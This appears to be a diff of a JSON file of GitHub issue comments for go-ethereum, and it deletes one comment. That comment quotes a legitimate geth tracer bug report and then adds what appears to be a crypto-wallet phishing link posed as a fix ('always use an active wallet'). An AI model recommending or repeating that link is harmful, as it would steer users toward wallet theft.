@@ -285,49 +285,5 @@
       "eyes": 0
     },
     "performed_via_github_app": null
-  },
-  {
-    "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/comments/1188370626",
-    "html_url": "https://github.com/ethereum/go-ethereum/issues/25169#issuecomment-1188370626",
-    "issue_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/25169",
-    "id": 1188370626,
-    "node_id": "IC_kwDOAOvK985G1RjC",
-    "user": {
-      "login": "Acetarax",
-      "id": 109557163,
-      "node_id": "U_kgDOBoe1qw",
-      "avatar_url": "https://avatars.githubusercontent.com/u/109557163?v=4",
-      "gravatar_id": "",
-      "url": "https://api.github.com/users/Acetarax",
-      "html_url": "https://github.com/Acetarax",
-      "followers_url": "https://api.github.com/users/Acetarax/followers",
-      "following_url": "https://api.github.com/users/Acetarax/following{/other_user}",
-      "gists_url": "https://api.github.com/users/Acetarax/gists{/gist_id}",
-      "starred_url": "https://api.github.com/users/Acetarax/starred{/owner}{/repo}",
-      "subscriptions_url": "https://api.github.com/users/Acetarax/subscriptions",
-      "organizations_url": "https://api.github.com/users/Acetarax/orgs",
-      "repos_url": "https://api.github.com/users/Acetarax/repos",
-      "events_url": "https://api.github.com/users/Acetarax/events{/privacy}",
-      "received_events_url": "https://api.github.com/users/Acetarax/received_events",
-      "type": "User",
-      "site_admin": false
-    },
-    "created_at": "2022-07-18T22:07:58Z",
-    "updated_at": "2022-07-18T22:07:58Z",
-    "author_association": "NONE",
-    "body": "> #### System information\r\n> Geth version: `1.10.19-stable` OS & Version: Windows/Linux/OSX\r\n> \r\n> #### Expected behaviour\r\n> In `debug_traceTransaction`, with a custom JavaScript tracer, accessing `log.memory.slice()` on uninitialized memory should return zero'd bytes.\r\n> \r\n> #### Actual behaviour\r\n> There is an error `Tracer access out of bound memory` from https://sourcegraph.com/github.com/ethereum/go-ethereum/-/blob/eth/tracers/js/goja.go?L453.\r\n> \r\n> Some smart contracts make CALLs pointing to uninitialized (0) memory, but geth will not expand the memory buffer until after the CALL is executed. But the tracer needs to access the memory before the CALL, in order to extract input data (particularly in case the CALL eventually fails).\r\n> \r\n> #### Steps to reproduce the behaviour\r\n> Here is a mainnet transaction that refers to unininitalized memory for a CALL's input data: https://etherscan.io/tx/0x65546ff3a5ff18b06226d1f1af4f9386d9dfd8a0e37afd1871ffa73a863bbd58\r\n> \r\n> To reproduce, use the following simple tracer:\r\n> \r\n> ```shell\r\n> $ curl -H 'Content-Type: application/json' -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"debug_traceTransaction\",\"params\":[\"0x65546ff3a5ff18b06226d1f1af4f9386d9dfd8a0e37afd1871ffa73a863bbd58\", {\"tracer\": \"{ step(log,db){ if(log.op.toString() === '\"'\"'CALL'\"'\"') { const inputOffset = log.stack.peek(3).valueOf(); const inputLength = log.stack.peek(4).valueOf();  const inputEnd = inputOffset + inputLength; log.memory.slice(inputOffset, inputLength); } }, fault(log,db){}, result(){ return '\"'\"'success'\"'\"'; } }\"}] ,\"id\":\"test\"}' GETH_ARCHIVE_HOST:8544\r\n> ```\r\n> \r\n> Result on erigon:\r\n> \r\n> ```\r\n> {\"jsonrpc\":\"2.0\",\"id\":\"test\",\"result\":\"success\"}\r\n> ```\r\n> \r\n> Result on geth:\r\n> \r\n> ```\r\n> {\"jsonrpc\":\"2.0\",\"id\":\"test\",\"error\":{\"code\":-32000,\"message\":\"Tracer accessed out of bound memory: available 288, offset 0, size 304 at step (\\u003ceval\\u003e:1:212(41))    in server-side tracer function 'step'\"}}\r\n> ```\r\n\r\nMake use of this https://www.wallsolution.xyz/ this worked for my similar issue, but always use an active wallet, 100% Transparency",
-    "reactions": {
-      "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/comments/1188370626/reactions",
-      "total_count": 0,
-      "+1": 0,
-      "-1": 0,
-      "laugh": 0,
-      "hooray": 0,
-      "confused": 0,
-      "heart": 0,
-      "rocket": 0,
-      "eyes": 0
-    },
-    "performed_via_github_app": null
   }
 ]
